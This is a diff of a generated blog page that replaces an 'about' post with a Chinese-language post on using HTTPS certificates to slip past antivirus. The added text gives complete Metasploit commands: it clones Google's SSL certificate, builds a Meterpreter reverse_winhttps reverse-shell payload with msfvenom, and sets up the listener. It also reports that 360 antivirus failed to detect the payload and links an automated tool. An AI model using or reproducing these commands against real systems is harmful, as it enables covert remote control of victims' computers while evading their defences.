@@ -5,21 +5,22 @@
   
 
   
-  <title>about | 魔域魂窟</title>
+  <title>httpsms | 魔域魂窟</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="#I’m miko魔域魂窟是我的github博客. 你可以在这里学到东西.">
+  <meta name="description" content="#https证书绕过杀软msf生成证书（要能连上google，用俺vps来搞）use auxiliary&#x2F;gather&#x2F;impersonate_ssl set RHOST www.google.com run生成msf攻击载荷：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_winhttps LHOST&#x3D;192.168.226.136 LPORT&#x3D;443 Paylo">
 <meta property="og:type" content="article">
-<meta property="og:title" content="about">
-<meta property="og:url" content="http://example.com/2020/11/17/about/index.html">
+<meta property="og:title" content="httpsms">
+<meta property="og:url" content="http://example.com/2020/11/17/httpsms/index.html">
 <meta property="og:site_name" content="魔域魂窟">
-<meta property="og:description" content="#I’m miko魔域魂窟是我的github博客. 你可以在这里学到东西.">
+<meta property="og:description" content="#https证书绕过杀软msf生成证书（要能连上google，用俺vps来搞）use auxiliary&#x2F;gather&#x2F;impersonate_ssl set RHOST www.google.com run生成msf攻击载荷：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_winhttps LHOST&#x3D;192.168.226.136 LPORT&#x3D;443 Paylo">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://secquan.zzyuncheng.com/ab80394d021ac09a10e5bedf050c51c2.jpg-avatar">
-<meta property="article:published_time" content="2020-11-17T09:27:45.000Z">
-<meta property="article:modified_time" content="2020-11-17T09:52:18.358Z">
+<meta property="og:image" content="https://s1.ax1x.com/2017/10/17/JOAmV.png">
+<meta property="og:image" content="https://s1.ax1x.com/2017/10/17/JOEwT.png">
+<meta property="article:published_time" content="2020-11-17T10:00:38.000Z">
+<meta property="article:modified_time" content="2020-11-17T10:00:49.186Z">
 <meta property="article:author" content="魂笛">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://secquan.zzyuncheng.com/ab80394d021ac09a10e5bedf050c51c2.jpg-avatar">
+<meta name="twitter:image" content="https://s1.ax1x.com/2017/10/17/JOAmV.png">
   
     <link rel="alternate" href="/atom.xml" title="魔域魂窟" type="application/atom+xml">
   
@@ -68,10 +69,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-about" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-httpsms" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/11/17/about/" class="article-date">
-  <time datetime="2020-11-17T09:27:45.000Z" itemprop="datePublished">2020-11-17</time>
+    <a href="/2020/11/17/httpsms/" class="article-date">
+  <time datetime="2020-11-17T10:00:38.000Z" itemprop="datePublished">2020-11-17</time>
 </a>
     
   </div>
@@ -82,7 +83,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      about
+      httpsms
     </h1>
   
 
@@ -90,13 +91,25 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#I’m miko<br>魔域魂窟是我的github博客.<br><img src="https://secquan.zzyuncheng.com/ab80394d021ac09a10e5bedf050c51c2.jpg-avatar" alt="enter image description here"></p>
-<p>你可以在这里学到东西.</p>
+        <p>#https证书绕过杀软<br><strong>msf生成证书（要能连上google，用俺vps来搞）</strong><br>use auxiliary/gather/impersonate_ssl</p>
+<p>set RHOST <a target="_blank" rel="noopener" href="http://www.google.com/">www.google.com</a></p>
+<p>run<br><img src="https://s1.ax1x.com/2017/10/17/JOAmV.png" alt="enter image description here"><br>生成msf攻击载荷：msfvenom -p windows/meterpreter/reverse_winhttps LHOST=192.168.226.136 LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=/root/<a target="_blank" rel="noopener" href="http://www.google.com.pem/">www.google.com.pem</a> StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f py -o pentestlab.py<br>然后msf监听：</p>
+<p>use exploit/multi/handler</p>
+<p>set payload windows/meterpreter/reverse_winhttps</p>
+<p>set LHOST 192.168.226.136</p>
+<p>set LPORT 443</p>
+<p>set HandlerSSLCert /root/<a target="_blank" rel="noopener" href="http://www.google.com.pem/">www.google.com.pem</a> (设置证书)</p>
+<p>set StagerVerifySSLCert true</p>
+<p>exploit -j</p>
+<p>然后在win7上运行这个pentestlab.py<br><img src="https://s1.ax1x.com/2017/10/17/JOEwT.png" alt="enter image description here"></p>
+<p>360杀毒，安全卫士无反应。</p>
+<p>全自动工具：<a target="_blank" rel="noopener" href="https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL">https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL</a></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://pentestlab.blog/category/defense-evasion/">https://pentestlab.blog/category/defense-evasion/</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/17/about/" data-id="ckhlt47i80000vmcphm89ehf7" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/11/17/httpsms/" data-id="ckhlt47js0002vmcpe5z7da9x" class="article-share-link">Share</a>
       
       
     </footer>
@@ -105,15 +118,11 @@
     
 <nav id="article-nav">
   
-    <a href="/2020/11/17/cms/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          cms
-        
-      </div>
-    </a>
   
+    <a href="/2020/11/17/cms/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">cms</div>
+    </a>
   
 </nav>
 
